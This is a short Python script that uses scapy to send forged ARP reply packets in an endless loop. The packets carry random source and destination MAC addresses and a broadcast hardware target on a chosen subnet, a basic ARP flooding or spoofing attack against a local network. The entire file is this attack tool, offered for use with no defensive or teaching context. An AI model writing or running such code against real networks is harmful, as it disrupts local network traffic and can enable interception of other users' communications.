from scapy.all import *
import typer
from rich.console import Console
console = Console()


BROADCAST = "FF:FF:FF:FF:FF:FF"
#Specify network address if different
def main(network_address: str = "10.0.0.0/24"):
    while 1:
        pkt = Ether(src=RandMAC(), dst=RandMAC())/ARP(op=2, psrc=network_address, hwdst=BROADCAST)
        sendp(pkt)



if __name__ == "__main__":
    typer.run(main)
